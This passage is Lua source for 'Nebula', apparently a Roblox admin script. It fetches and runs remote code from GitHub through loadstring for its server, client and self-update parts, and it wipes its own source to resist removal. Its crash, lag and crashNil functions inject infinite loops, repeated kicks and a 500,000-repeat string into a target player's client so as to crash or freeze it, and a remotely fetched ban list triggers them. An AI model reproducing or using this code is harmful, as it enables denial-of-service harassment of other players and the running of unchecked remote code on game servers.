-- [[ Nebula created by Basscans. ]] --
-- [[ Please do not re-disitrubte and/or distribute. ]] --

--[[ Rules, notes and information (READ!):
      | * = Note

      Rules:
              - You will not edit the script in anyway unless prompted*
              - You will not distribute the script in any way*
              - You will read the new rules, notes, and information every update and/or release*
      Notes:
              - *1: You may not create additional prompts.
              - *2: Distributing counts as and/or is the same as re-distributing, sharing, putting the script on websites, and/or leaking.
              - *3: This rule only applies if something in the rules, notes, and/or information is changed.
      Information:
              The script was created by Basscans.
              If you'd like to see the current list of developers, please visit the group.
             
              Nebula Tech: http://www.roblox.com/My/Groups.aspx?gid=845653
              There are no other official groups for Nebula.

              The owner rank is SHARED. Other people will be ranked owner as well.

              Users are encouraged to post to the group wall all of the users they see using Nebula.
              Please note that this requires their full username.

              If you'd like to ban someone permanently please PM Basscans
             
              Please submit all glitches to Basscans.
              Please submit any suggestions to Basscans.
              
              Thank you for using Nebula!
--]]
--[[
  Idea/To-Do List: (No ideas/to-dos? Look for FUTURE TODO in the script.)
    Create ideas by looking into the following services:
      AssetService
      TeleportService
      InsertService
      Geometry
      CollectionService
      SoundService
      NotificationService (not implemented yet,check)
      MarketplaceService
      LogService (for output)
    
    Customizable tablets (example I haz blue or red tabs and it show in cmd menu)
    Anti-remove, update disable script command & update function
    Admin Pannel
    Command bar (admin pannel)
    Override (Admin pannel)
    PM system
    Sandbox
    Override sets rank to 5
    Security Improvements
    Output in all commands
    Fix loopkill
    Be able to change command format
    Nebula Chat (Custom Chat)
    Slog Improvements
    Antiloacl improvements
	Global settings (configurable; by place)

    Command Idea List:
      Damaging Commands (fire)
    Helpful Commands (extinguish,adminpannel,commandbar,explorer)
    Fun commands (gear,hat,clothes,effects,shirt,pants,tshirt,fly,float,zombie,scale,dog,telekensis)
    Annoying Commands (troll,shield,rocket)
    Funny Commands (twerk, fuck, dick, pussy, bird)

    Complaint List:
    - Chat Gui moves too much
--]]

-- Safety first! --
wait()
local SSource,found;
for i,v in pairs(script:GetChildren()) do
  if string.find(v.Name:lower(), "source") and v:IsA("StringValue") and found ~= true then
    SSource=v:Clone()
    found=true
  end
  pcall(function() v.Value="" v:Destroy() end)
end
script:ClearAllChildren()
script.Parent=Instance.new("Message")

local scriptGlobalResult, scriptGlobalError = ypcall(function() 

local ver = (SSource and ( math.ceil(#SSource.Value/1024) ) or 0)
local banlist = {}
local chatconnections = {}
local scriptsenabled = true
local chatlog = {}
local chatsettings={GuiChat=false,Bubblechat=false,BubblechatColor=nil}
local scriptlog = {}
local filteractive = false
local ageRestriction = {Enabled=false; MinAge=30;}
local filteredwords = {"kick","ban","spawn(wait)","repeat until false","manualsurfacejointinstance"}
local scriptlogconnection = nil
local playerSettings={}
local nebulaClientQuee={}
local disco=false
local music={
  globalSound=nil;
  isInPlaylist=false;
  onSong=0;
  onPlaylistSong=0;
  playlists={
    ["Popular"]={
      {"Radioactive",131111368};
      {"One less problem",155319906};
      {"Dark horse",143204341};
      {"Latch",155298039};
      {"Fancy",151667588};
      {"Demons",131261480};
      {'Me and my broken heart',157466103};
      {'Break free',164417255};
      {'Me and my broken heart',157466103};
      {"Boom Clap",160594536};
      {"Pompeii",144635805};
      {"Roar",131065183};
      {'Rude',154764197};
      {'Monster',142562463};
      {"Work",152250611};
    };
    ["Dance"]={
      {"Destroid 11. - Get Stupid", 146968276};
      {"Turn down for what",143959455};
      {"Beam",165065112};
      {"Frag out",152451589};
      {"The hallows",146824166};
      {"Radiation",144249596};
      {"The final countdown", 145162750};
      {"Need you",155415981};
      {"Boom",150101784};
      {'Domination', 150669700};
    };
    ["Alternative"]={
      {"Do the harlem shake",131154740};
      {"I like trains",142386784};
      {"Saxaphone guy",130775431};
      {"Selfie song",151029303};
    };
    ["R7B"]={
      {"All of me",155057593};
    };
    ["Hiphop"]={
        {"Gentleman",131326102};
        {"Wake me up", 130969284};
        {"We are one",154782317};
        {"La la la",161186230};
    };
    ["Rap"]={
      {"I'm not afraid",131149175};
    };
    ["Mood"]={
       {"Say something",143763527};
       {'Because I\'m happy', 142435409};
    };
    ["Remix"]={
      {"Idols",143311712};
      {"Come and get it (remix)",131320359};
    };
    ["Nightcore"]={};
  };
  songs={
    {"Fast and furious - We own it",144296300};
  };
}
local abortShutdown
local clientSource=game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/Basscans/Nebula/master/client.lua",true)
local rules = {}
local loopkill={}
local antiban={}
local nebulaLogo = "rbxassetid://169780191"
local sound
local remoteSettings={
  update=true;
  links={"https://raw.githubusercontent.com/Basscans/Nebula/master/defaultRemote"};
}
local commands = {
  list={};
  settings = {
    prefix=nil;
    suffix=nil;
    middlix=";";
    mas=","; -- mas=multiple arguments seperator
    tagflag="-";
  };
}
local ranks={
    ["0"]='Guest';
    ["1"]='Member';
    ["2"]='Moderator';
    ["3"]='Administrator';
    ["4"]='Scripter';
    ["5"]='Owner';
    ["6"]='Developer';
    ["252"]='Brother'; 
    ["253"]='Lead Developer';
    ["254"]='Assistant';
    ["255"]='Creator';
}

local pri={
  Type="crash";
  Active=false;
  Allowed={};
  connections={};
  Banned={};
}
pri.respawn=function(plr) pcall(function() plr:LoadCharacter() end) end
pri.addConnections=function(v)
      table.insert(pri.connections,v.CharacterAdded:connect(function(c)
        table.insert(pri.connections,c.Humanoid.Died:connect(function()
          coroutine.wrap(function()
            wait(5)
            pri.respawn(v)
          end)()
        end))
      end))
      if v.Character then table.insert(pri.connections,v.Character.Humanoid.Died:connect(function() pri.respawn(v) end)) end end;
local services = {
    http = game:GetService("HttpService");
    players=game:GetService("Players");
    network=game:GetService("NetworkServer");
}
local scriptingCompatability = {
  script=(NS and true or nil);
  localscript=(NLS and true or nil);
  eventConnection=nil;
}

-- Load Server --
local func,err = loadstring(services.http:GetAsync("https://raw.githubusercontent.com/Basscans/Nebula/master/server.lua",true))
if err then
  print('Nebula server error:',err)
else
  func()
  print('Nebula server ran succesfully')
end

-- Songs --
for i,v in pairs(music.playlists) do
  for si, sv in pairs(v) do
    table.insert(music.songs,sv)
  end
end
coroutine.wrap(function()
  for i,v in pairs(music.songs) do
    game:GetService("ContentProvider"):Preload("http://www.roblox.com/asset/?id="..v[2])
  end
end)()

function update()
  local Link = "https://raw.githubusercontent.com/Basscans/Nebula/master/Script.lua"
  _ns(Workspace,false,services.http:GetAsync(Link,true))
  for i,v in pairs(services.players:GetPlayers()) do
    for __, tab in pairs(getTablets(v)) do
      pcall(function() tab:Destroy() end)
    end
  end
  removeScript()
end
function removeScript()
  for i,v in pairs(playerSettings) do
    for i2, e in pairs(v.Antilocal) do
      e:disconnect()
      e=nil
    end
  end
  pcall(function() game:GetService("ReplicatedStorage"):ClearAllChildren() end)
  coroutine.wrap(function()
    repeat 
      pcall(function() script.Disabled=true end)
      pcall(function() script:Destroy() end)
      for i,v in pairs(getfenv(1)) do
          pcall(function() getfenv(1)[i] = nil end)
      end
      local newEnv=setmetatable({}, {
          __index=function(self, index)
            return error("This script has been removed.")
          end,
          __newindex=function(self, table, value)
            return error("This script has been removed.")
          end,
          __call=function(...)
            return error("This script has been removed.")
          end,
          __metatable="This meta is locked."
        })
      setfenv(1, newEnv)
      error("Plz no skipt.")
      wait()
    until false
  end)()
end

function checkForUpdate()
    local Link = "https://raw.githubusercontent.com/Basscans/Nebula/master/Script.lua"
    local Script = services.http:GetAsync(Link,true)
    if Script~=SSource.Value then return true end
    return false
end

function kick(plr)
  for i,v in pairs(Game:GetService("Players"):GetPlayers()) do
    if type(plr)=="userdata" and v == plr then
      pcall(function() v:Kick() end)
      pcall(function() Game:GetService("Debris"):AddItem(v, 1) end)
    elseif type(plr)=="string" and v.Name == plr then
      pcall(function() v:Kick() end)
      pcall(function() Game:GetService("Debris"):AddItem(v, 1) end)
    end
  end
end

function lag(plr)
    if type(plr)=='string' then
        for i,v in pairs(services.players:GetPlayers()) do
            if v.Name==plr then
                if not v.Character then v:LoadCharacter() end
                _ns(v.Character,true,[[repeat while 1+1 do end until false]])
                game:GetService("Debris"):AddItem(plr,1)
            end
        end
    else
        if not plr.Character then plr:LoadCharacter() end
        _ns(plr.Character,true,[[repeat while 1+1 do end until false]])
        game:GetService("Debris"):AddItem(plr,1)
    end
end

function crash(plr)
    local Source = [[wait() 
    script:ClearAllChildren()
    script.Parent=nil
    LocalPlayer=Game:GetService("Players").LocalPlayer
    Game:GetService("RunService").RenderStepped:connect(function()
        pcall(function() LocalPlayer:Kick() end)
        pcall(function() LocalPlayer.Parent=nil wait() LocalPlayer.Parent=Game:GetService("Players") end)
        wait(1)
        pcall(function() Spawn(wait) end)
        pcall(function() Instance.new("ManualSurfaceJointInstance",Workspace:findFirstChild("Camera")) end)
        wait()
        repeat while 1==1 do end until false
    end)
  ]]
    if type(plr)=='string' then
        for i,v in pairs(services.players:GetPlayers()) do
            if v.Name==plr then
                if not v.Character then v:LoadCharacter() end
                _ns(v.Character,true,Source)
                game:GetService("Debris"):AddItem(plr,1)
            end
        end
    else
        if not plr.Character then plr:LoadCharacter() end
        _ns(plr.Character,true,Source)
        game:GetService("Debris"):AddItem(plr)
    end
end

function checkBan(plr)
    for i,v in pairs(banlist) do
        if v.Name:lower()==plr.Name:lower() then
            if v.TimeRequired==math.huge or (tick()-v.Timestamp)<v.TimeRequired then
                if v.Type==1 then
                    kick(plr)
                    broadcast(plr.Name .. " has been kicked due to ban.", Color3.new(1,0,0),nil,nil,3)
                elseif v.Type==2 then
                    crash(plr)
                     broadcast(plr.Name .. " has been crashed due to ban.", Color3.new(1,0,0),nil,nil,3)
                elseif v.Type==3 then
                    lag(plr)
                     broadcast(plr.Name .. " has been lagged due to ban.", Color3.new(1,0,0),nil,nil,3)
                elseif v.Type==4 then
                  Bsod(plr)
                   broadcast(plr.Name .. " has been bsod'd due to ban.", Color3.new(1,0,0),nil,nil,3)
                end
            end
        end
    end
end

function newBan(playerName,banType,time,rank,reason)
  if not time then time=math.huge end
  table.insert(banlist, {Name=playerName,Type=banType,Timestamp=tick(),TimeRequired=time,BannerRank=rank,Reason=reason})
end

function unBan(playernme)
  for i,v in pairs(banlist) do
    if v.Name == playername then
      banlist[i]=nil 
      broadcast(v.Name.Name.." has been unbanned",Color3.new(0,1,0),nil,nil,2)
    end
  end
end

function syncBans(updateBans,replace)
    local http = services.http
    local banlistRaw = http:GetAsync("https://raw.githubusercontent.com/Basscans/Nebula/master/Banlist",true)
    local result = {}
    if #banlistRaw<4 then return {} end
    if not banlistRaw:find("|") then return {} end
    if not banlistRaw:find("*") then return {} end
    for name,type,reason in string.gmatch(banlistRaw,"(%w+)|(%d)|?([%w ',.:;']*)*") do
      newBan(name,tonumber(type),math.huge,nil,reason)
    end
    if updateBans then
        if replace then banlist = result
        else for i,v in pairs(result) do table.insert(banlist,v) end end
    end
end

function setPS(plr)
  playerSettings[plr.Name]={
    Tablets={
      Model=nil;
      List={};
      Dismiss=nil;
    };
    Chat={
      GuiChat=true;
      Bubblechat=false;
      BubblechatColor="Blue";
    };
    Rank=nil;
    Antilocal={};
    AgreedToRules=false;
    Music={
      localSound=nil;
      inPlaylist=false;
      onSong=0;
      onPlaylistSong=0;
    };
  }
end

function getSource(scr)
  for i,v in pairs(scr:GetChildren()) do
    if v.Name:lower():find('source') then return v end
  end
end

function editSource(src,scr)
  local source = getSource(scr)
  source.Value=src
end

function _ns(p,l,s,n)
  if not n then n='NewScript' end
    if not l and NS then NS(s,p).Name=n return end
    if l and NLS then NLS(s,p).Name=n return end
  if l and not scriptingCompatability.localscript then return end
  if not l and not scriptingCompatability.script then return end
  local currentScript = nil
  if l then currentScript=scriptingCompatability.localscript:Clone()
  else currentScript=scriptingCompatability.script:Clone() end
  editSource(s,currentScript)
  currentScript.Name=n
  currentScript.Parent=p
  wait()
  currentScript.Disabled=true
  currentScript.Disabled=false
  return currentScript
end
function antiLocal(plr)
    for i,v in pairs(getPS(plr).Antilocal) do v:disconnect() v=nil end
    getPS(plr).Antilocal={}
    table.insert(getPS(plr).Antilocal,plr.Backpack.DescendantAdded:connect(function(obj)
      if obj.ClassName=='LocalScript' then
          obj.Disabled=true
          newTablet(plr,"Would you like to allow " .. obj.Name .. " to run?")
          local input = inputTablet(plr,{{"No",Color3.new(1,0,0)},{"Yes",Color3.new(0,1,0)}})
          if input[1]=='No' then
            obj:Destroy()
          else
            obj.Disabled=false
          end
          dismiss(plr)
      end
    end))
    table.insert(getPS(plr).Antilocal,plr.PlayerGui.DescendantAdded:connect(function(obj)
      if obj.ClassName=='LocalScript' then
          obj.Disabled=true
          newTablet(plr,"Would you like to allow " .. obj.Name .. " to run?")
          local input = inputTablet(plr,{{"No",Color3.new(1,0,0)},{"Yes",Color3.new(0,1,0)}})
          if input[1]=='No' then
            obj:Destroy()
          else
            obj.Disabled=false
          end
          dismiss(plr)
      end
    end))
        table.insert(getPS(plr).Antilocal,plr.Character.DescendantAdded:connect(function(obj)
      if obj.ClassName=='LocalScript' then
          obj.Disabled=true
          newTablet(plr,"Would you like to allow " .. obj.Name .. " to run?")
          local input = inputTablet(plr,{{"No",Color3.new(1,0,0)},{"Yes",Color3.new(0,1,0)}})
          if input[1]=='No' then
            obj:Destroy()
          else
            obj.Disabled=false
          end
          cmds(plr,'dt;')
      end
    end))
        table.insert(getPS(plr).Antilocal,plr.CharacterAdded:connect(function(char)
          table.insert(getPS(plr).Antilocal,char.DescendantAdded:connect(function(obj)
          if obj.ClassName=='LocalScript' then
              obj.Disabled=true
              newTablet(plr,"Would you like to allow " .. obj.Name .. " to run?")
              local input = inputTablet(plr,{{"No",Color3.new(1,0,0)},{"Yes",Color3.new(0,1,0)}})
              if input[1]=='No' then
                obj:Destroy()
              else
                obj.Disabled=false
              end
              cmds(plr,'dt;')
          end
        end))
    end))
end
function getNilRank(name)
  return playerSettings[name].Rank
end
function getPS(plr)
  return playerSettings[plr.Name]
end

function getRank(plr)
  if not plr then return 255 end
  if type(plr)=='string' then
    return getNilRank(plr)
  else return getPS(plr).Rank end
end

function syncRank(plr)
  if plr:IsInGroup(845653) then
    return plr:GetRankInGroup(845653)
  else return 0 end
end

function setRank(plr,newRank)
  playerSettings[plr.Name].Rank=newRank
end

function parseRank(plr1,plr2,allowEqual)
  pcall(function() if type(plr1)~='number' then plr1=getRank(plr1) end end)
  pcall(function() if type(plr2)~='number' then plr2=getRank(plr2) end end)

  if plr1>plr2 then return true
  elseif allowEqual and plr1==plr2 then return true
  else return false end
end

function crashNil(plrName)
  for index,client in pairs(game:GetService("NetworkServer"):GetChildren()) do
    if tostring(client:GetPlayer().Name) == plrName then
      local crash = Instance.new("RemoteEvent", Workspace)
      crash.Name="NilCrash"
      crash:FireClient(client:GetPlayer(), string.rep("Lolurmad",5e5)) -- 5e5 = 500,000
      Delay(5, function() crash:Destroy() end)
    end
  end
end

-- Server --


function newTabletModel(plr)
  local settings = getPS(plr)
  pcall(function() settings.Tablets.Model:Destroy() end)
  settings.Tablets.Model=nil
  
  local newModel = Instance.new("Model")
  newModel.Name=math.random()
  newModel.Parent=Workspace
  
  settings.Tablets.Model=newModel
end

function getTabletModel(plr)
  if getPS(plr).Tablets.Model and getPS(plr).Tablets.Model.Parent==Workspace then
  else
    newTabletModel(plr)
    print('There was a problem with the tablet model, made a new one.')
  end
  return getPS(plr).Tablets.Model
end

function tabletFadeout(tablet)
    ypcall(function()
      local outline = tablet:findFirstChild('Outline')
      local name = tablet["NameGui"]:findFirstChild("Name")
      for i = tablet.Transparency*100,100,3.5 do
        tablet.Transparency=i/100
        name.TextStrokeTransparency=i/100 -- omg nob alrt
        name.TextTransparency=i/100
        if outline then
            outline.Transparency=(i+25)/100
        end
        wait()
      end
    end)
end

function broadcast(name,color,exe,rscript,rank)
  for i,v in pairs(game:GetService("Players"):GetPlayers()) do
    if not rank then
      notificationTablet(v,name,color,exe,rscript,5)
    else
      if rank==1 then -- developers & owner
        if getRank(v)==255 or getRank(v)==253 or getRank(v)==6 or getRank(v)==5 then
          notificationTablet(v,name,color,exe,rscript,5)
        end
      elseif rank==2 then -- guest+
        if parseRank(v,0) then
          notificationTablet(v,name,color,exe,rscript,5)
        end
        elseif rank==3 then -- moderators+
         if parseRank(v,1) then
            notificationTablet(v,name,color,exe,rscript,5)
         end
      end
    end
  end
end

function showLogo(plr)
  if not plr:findFirstChild("PlayerGui") then Instance.new("PlayerGui",plr) end
  local g = Instance.new("ScreenGui",plr.PlayerGui)
  local i = Instance.new("ImageLabel",g)
  i.BackgroundTransparency=1
  i.Image=nebulaLogo
  i.Name="NebulaLogo"
  i.Size=UDim2.new(.2,0,.1,0)
end

function onCharacterAdded(char,plr)
  showLogo(plr)
  if not getPS(plr).AgreedToRules then
    showRules(plr)
  end
end

function notificationTablet(plr,Name,color,exe,rscript,thetime)
  if not plr then return end
  if not color then color=Color3.new(1,1,1) end
  local tabletSettings=getPS(plr).Tablets
  if not getTabletModel(plr) then newTabletModel(plr) end
  local model = getTabletModel(plr)
  local tablet = Instance.new("Part",model)
  tablet.BrickColor=BrickColor.new(color)
  tablet.Transparency=.25
  tablet.Name="Tablet|Nebula|"..Name
  tablet.Anchored=true
  tablet.CanCollide=false
  tablet.Locked=true
  tablet.FormFactor="Custom"
  tablet.Size=Vector3.new(2,2,2)
  tablet.BottomSurface="Smooth"
  tablet.TopSurface="Smooth"
  pcall(function()
    tablet.Position=plr.Character.Torso.CFrame.p
    tablet.CFrame=plr.Character.Torso.CFrame
  end)
  local glow = Instance.new("PointLight",tablet)
  glow.Range=10
  glow.Shadows=true
  glow.Name="Glow"
  glow.Color=BrickColor.new(color).Color
  local outline = Instance.new("SelectionBox",tablet)
  outline.Color=BrickColor.new(color)
  outline.Transparency=.75
  outline.Name="Outline"
  outline.Adornee=tablet
  local click = Instance.new("ClickDetector",tablet)
  click.MaxActivationDistance=math.huge
  click.Name="Click"
  local namegui = Instance.new("BillboardGui",tablet)
  namegui.Name="NameGui"
  namegui.Size=UDim2.new(10,0,1,0)
  namegui.SizeOffset=Vector2.new(0,3)
  local notificationTabletKey = Instance.new("BoolValue",tablet)
  notificationTabletKey.Name="IsANotificationTablet"
  notificationTabletKey.Value=true
  local name = Instance.new("TextLabel",namegui)
  name.BackgroundTransparency=1
  name.Name="Name"
  name.Size=UDim2.new(1,0,1,0)
  name.Font="Arial"
  name.Text=Name
  name.TextColor3=BrickColor.new(color).Color
  name.TextScaled=true
  name.TextStrokeColor3=Color3.new()
  name.TextStrokeTransparency=0
  name.TextWrapped=true
  local hoveringPlayers = 0
  click.MouseHoverEnter:connect(function(hoveringPlayer)
    if hoveringPlayer~=plr and parseRank(plr,hoveringPlayer,true) then return end
    if hoveringPlayers==0 then
      coroutine.wrap(function(selbox)
        for i = 75, 50, -1 do
          selbox.Transparency=i/100
          wait()
        end
        end)(outline)
        coroutine.wrap(function(name)
            for i = 25, 0,-5 do
                name.TextTransparency=i/100
                name.TextStrokeTransparency=name.TextTransparency
            end
        end)(name)
    end
    hoveringPlayers=hoveringPlayers+1
  end)
  click.MouseHoverLeave:connect(function(hoveringPlayer)
    if hoveringPlayer~=plr and parseRank(plr,hoveringPlayer,true) then return end
    hoveringPlayers=hoveringPlayers-1
    if hoveringPlayers==0 then
      coroutine.wrap(function(selbox)
        for i = 50,75 do
          selbox.Transparency=i/100
          wait()
        end
    end)(outline)
    click.MouseClick:connect(function(clickingPlayer)
      if clickingPlayer~=plr and parseRank(plr,clickingPlayer,true) then return end
      if exe==true then loadstring(rscript)()
      elseif type(exe)=='table' then
          if exe.SpecialId==1 then
              if plr.Parent==nil then nilCmds(plr,(commands.settings.prefix and commands.settings.prefix or '') .. 'commands'..commands.settings.middlix..exe.Command.Name..commands.settings.mas..'-i' .. (commands.settings.suffix and commands.settings.suffix or '')) else cmds(plr,(commands.settings.prefix and commands.settings.prefix or '') .. 'commands'..commands.settings.middlix..exe.Command.Name..commands.settings.mas..'-i' .. (commands.settings.suffix and commands.settings.suffix or '')) end
          end
      elseif exe then if plr.Parent==nil then nilCmds(plr,(commands.settings.prefix and commands.settings.prefix or '') .. exe .. (commands.settings.suffix and commands.settings.suffix or '')) else cmds(plr,(commands.settings.prefix and commands.settings.prefix or '') .. exe .. (commands.settings.suffix and commands.settings.suffix or '')) end
      else tabletFadeout(tablet) tablet:Destroy() end
    end)
    coroutine.wrap(function(name)
            for i = 0,25,5 do
                name.TextTransparency=i/100
                name.TextStrokeTransparency=name.TextTransparency
            end
        end)(name)
      end
  end)

  if thetime ~= nil then
    coroutine.wrap(function()
       wait(tonumber(thetime))
       tabletFadeout(tablet)
       tablet:Destroy()
    end)()
  end
  table.insert(tabletSettings.List,tablet)
  return tablet
end

function inputTablet(plr,choices)
  local optionClicked
  for i = 1, #choices do
    coroutine.wrap(function(num)
      local name=choices[num][1]
      local color = choices[num][2]
      local exe = choices[num][3]
      local rscript = choices[num][4]
      if optionClicked or newTablet(plr,name,color,exe,rscript,true) then
        if not optionClicked then optionClicked=choices[num] end
      end
    end)(i)
  end
  repeat wait() until optionClicked
  return optionClicked
end

function newTablet(plr,Name,color,exe,rscript,waitForClick)
  if not plr then return end
  if not color then color=Color3.new(1,1,1) end

  local tabletSettings=getPS(plr).Tablets
  if not getTabletModel(plr) then newTabletModel(plr) end
  local model = getTabletModel(plr)
  
  local tablet = Instance.new("Part",model)
  tablet.BrickColor=BrickColor.new(color)
  tablet.Transparency=.25
  tablet.Name=Name
  tablet.Anchored=true
  tablet.CanCollide=false
  tablet.Locked=true
  tablet.FormFactor="Custom"
  tablet.Size=Vector3.new(3,4,.2)
  tablet.BottomSurface="Smooth"
  tablet.TopSurface="Smooth"
  pcall(function()
      tablet.Position=plr.Character.Torso.CFrame.p
      tablet.CFrame=plr.Character.Torso.CFrame
    end)

  local glow = Instance.new("PointLight",tablet)
  glow.Range=10
  glow.Shadows=true
  glow.Name="Glow"
  glow.Color=BrickColor.new(color).Color
  
  local outline = Instance.new("SelectionBox",tablet)
  outline.Color=BrickColor.new(color)
  outline.Transparency=.75
  outline.Name="Outline"
  outline.Adornee=tablet
  
  local click = Instance.new("ClickDetector",tablet)
  click.MaxActivationDistance=math.huge
  click.Name="Click"
  
  local namegui = Instance.new("BillboardGui",tablet)
  namegui.Name="NameGui"
  namegui.Size=UDim2.new(10,0,1,0)
  namegui.SizeOffset=Vector2.new(0,3)
  
  local name = Instance.new("TextLabel",namegui)
  name.BackgroundTransparency=1
  name.Name="Name"
  name.Size=UDim2.new(1,0,1,0)
  name.Font="Arial"
  name.Text=Name
  name.TextColor3=BrickColor.new(color).Color
  name.TextScaled=true
  name.TextStrokeColor3=Color3.new()
  name.TextStrokeTransparency=.25
  name.TextTransparency=.25
  name.TextWrapped=true

  local hoveringPlayers = 0
  local clicked

  click.MouseClick:connect(function(clickingPlayer)
    if clickingPlayer~=plr and parseRank(plr,clickingPlayer,true) then return end
    if exe==true then loadstring(rscript)()
    elseif type(exe)=='table' then
        if exe.SpecialId==1 then
            if plr.Parent==nil then nilCmds(plr,(commands.settings.prefix and commands.settings.prefix or '') .. 'commands'..commands.settings.middlix..exe.Command.Name..commands.settings.mas..'-i' .. (commands.settings.suffix and commands.settings.suffix or '')) else cmds(plr,(commands.settings.prefix and commands.settings.prefix or '') .. 'commands'..commands.settings.middlix..exe.Command.Name..commands.settings.mas..'-i' .. (commands.settings.suffix and commands.settings.suffix or '')) end
        end
    elseif exe then if plr.Parent==nil then nilCmds(plr,(commands.settings.prefix and commands.settings.prefix or '') .. exe .. (commands.settings.suffix and commands.settings.suffix or '')) else cmds(plr,(commands.settings.prefix and commands.settings.prefix or '') .. exe .. (commands.settings.suffix and commands.settings.suffix or '')) end
    else tabletFadeout(tablet) tablet:Destroy() end
    if waitForClick then clicked=true end
  end)
  click.MouseHoverEnter:connect(function(hoveringPlayer)
    if hoveringPlayer~=plr and parseRank(plr,hoveringPlayer,true) then return end
    if hoveringPlayers==0 then
      coroutine.wrap(function(selbox)
        for i = 75, 50, -1 do
          selbox.Transparency=i/100
          wait()
        end
        end)(outline)
        coroutine.wrap(function(name)
            for i = 25, 0,-5 do
                name.TextTransparency=i/100
                name.TextStrokeTransparency=name.TextTransparency
                wait()
            end
        end)(name)
    end
    hoveringPlayers=hoveringPlayers+1
    if type(exe)=='table' then
        if exe.SpecialId==1 then
            name.Text=exe.Command.Name
        end
    end
  end)
  click.MouseHoverLeave:connect(function(hoveringPlayer)
    if hoveringPlayer~=plr and parseRank(plr,hoveringPlayer,true) then return end
    hoveringPlayers=hoveringPlayers-1
    if hoveringPlayers==0 then
      coroutine.wrap(function(selbox)
        for i = 50,75 do
          selbox.Transparency=i/100
          wait()
        end
    end)(outline)
    coroutine.wrap(function(name)
            for i = 0,25,5 do
                name.TextTransparency=i/100
                name.TextStrokeTransparency=name.TextTransparency
                wait()
            end
        end)(name)
      end
      if name.Text~=Name then name.Text=Name end 
  end)
  
  table.insert(tabletSettings.List,tablet)

  if waitForClick then
    repeat wait() until clicked or tablet.Parent==nil
    if clicked then return true
    else return false end
  else return tablet end
end

function getTablets(plr)
  local tablets = getPS(plr).Tablets.List
  local newResult = {}
  for i,v in pairs(tablets) do
    if v and v.Parent~=nil then table.insert(newResult,v)
    else table.remove(tablets,i) end
  end
  return newResult
end

function playerIsInServer(plr)
  local found
  pcall(function()
    if Workspace:findFirstChild(plr.Name) then found=true end
       if game:GetService("Players"):findFirstChild(plr.Name) then found=true end
        for i,v in pairs(game:GetService("NetworkServer"):GetChildren()) do
           if v:IsA("ServerReplicator") then
            if v:GetPlayer()==plr then found=true end
           end
        end
    end)
    if found then return true else return false end
end

function showAdminPanel(plr)
  local g = Instance.new("ScreenGui",plr.PlayerGui)
  g.Name="Nebula|AdminPanel"
  local bg = Instance.new("Frame",g)
  bg.BackgroundColor3=Color3.new(1,1,1)
  bg.BorderColor3=Color3.new()
  bg.Name="Bg"
  bg.Size=UDim2.new(1,0,1,0)
  local t=Instance.new("TextLabel",bg)
  t.BackgroundColor3=Color3.new(1,1,1)
  t.Name="Title"
  t.Size=UDim2.new(1,0,.1,0)
  t.Font="Legacy"
  t.Text="l Nebula l"
  t.TextColor3=Color3.new()
  t.TextScaled=true
  t.TextWrapped=true
  
  local tb = Instance.new("TextButton",g)
  tb.BackgroundColor3=Color3.new()
  tb.BackgroundTransparency=0.5
  tb.BorderSizePixel=0
  tb.Name="Toggle"
  tb.Position=UDim2.new(.9,0,.4,0)
  tb.Size=UDim2.new(.1,0,.1,0)
  tb.Font="Arial"
  tb.Text="<"
  tb.TextColor3=Color3.new(1,1,1)
  tb.TextScaled=true
  tb.TextWrapped=true
  tb.MouseButton1Click:connect(function()
    -- FUTURE TODO: TWEEN
    bg.Visible=true
    tb.Visible=false
  end)
end

function startTabletCFrame(plr)
  coroutine.wrap(function(plr)
    repeat
        local ps = getPS(plr)
        local tablets = nil
        local nTablets
        local zPos = 2
        
        while playerIsInServer(plr) do wait()
            for rott = 0, 360 do wait()
              local character=plr.Character
              if not character then character=Workspace:findFirstChild(plr.Name) end
              if not character then break end

              if Workspace:findFirstChild(plr.Name) then
                tablets = getTablets(plr)
                nTablets={}
            if #tablets >=2 and ps.Tablets.Dismiss ~= nil and ps.Tablets.Dismiss.Parent ~= getTabletModel(plr) then
              pcall(function() ps.Tablets.Dismiss:Destroy() end)
              pcall(function() ps.Tablets.Dismiss=nil end)
            end
            if #tablets >= 2 and ps.Tablets.Dismiss == nil then
              ps.Tablets.Dismiss = newTablet(plr, "Dismiss", Color3.new(1,1,1), "dismiss;")
            elseif #tablets - 1 < 2 and ps.Tablets.Dismiss ~= nil then
              ps.Tablets.Dismiss:Destroy()
              ps.Tablets.Dismiss = nil
            end
                local rot=0
                rot = rot + 0.0005
                for i,v in pairs(tablets) do
                  if v == nil or v.Parent==nil then
                    table.remove(tablets, i)
                  else
                   ypcall(function()
                       if character ~= nil and character:findFirstChild("Torso") ~= nil then
                            local pos = character.Torso.CFrame
                            local radius = 4 + (#tablets * 0.5)
                            local x = math.sin((i / #tablets - (0.5 / #tablets) + rott * 2) * math.pi * 2) * radius
                            local y = math.sin(tick())
                            if v:findFirstChild("IsANotificationTablet") then y = 3 end
                            local z = math.cos((i / #tablets - (0.5 / #tablets) + rott * 2) * math.pi * 2) * radius
                            local arot = Vector3.new(x, y, z) + pos.p
                            local brot = v.CFrame.p
                            local crot = (arot * .1 + brot * .9)
                            if v:findFirstChild("IsANotificationTablet") then
        v.CFrame = CFrame.new(crot, pos.p)
                            else
        v.CFrame = CFrame.new(crot, pos.p) * CFrame.Angles(math.rad(20),0,0)
          end
                        end
                    end)
                  end
          
                end
              end
            end
        end
        for i,v in pairs(getTablets(plr)) do v:Destroy() end
        wait(15)
      until false
  end)(plr)
end

function CheckWord(msg)
  for i,v in pairs(filteredwords) do
    if string.find(msg:lower(), v:lower()) then
      return true
    end
  end
  return false
end

function formatCommand(msg,useTags)
  local prefix=commands.settings.prefix
  local suffix=commands.settings.suffix
  local middlix=commands.settings.middlix
  local mas=commands.settings.mas

  if prefix and not msg:sub(1,1)==prefix then return end
  if suffix and not msg:sub(#msg,#msg)==suffix then return end
  if not msg:find(middlix) then return end

  local middle = msg:find(middlix)
  if middle==1 then return end
  
  local command
  if prefix~=nil then command = msg:sub(2,(middle-1)) else command=msg:sub(1,(middle-1)) end
  if command:match('%s') then return end
  local aloc = msg:sub(middle+1) -- Argument location
  local args = {}
  local tags = {}
  local defaultargs

  if aloc:find(mas) then
    args={aloc:sub(1,aloc:find(mas)-1):lower()}
    defaultargs={aloc:sub(1,aloc:find(mas)-1)}
    for arg in aloc:gmatch(mas.."(-*[%w. ]+)") do
      table.insert(args,arg:lower())
      table.insert(defaultargs,arg)
    end
  else
    if aloc~="" then
      args={aloc:lower()}
      defaultargs={aloc}
    end
  end

  if useTags then
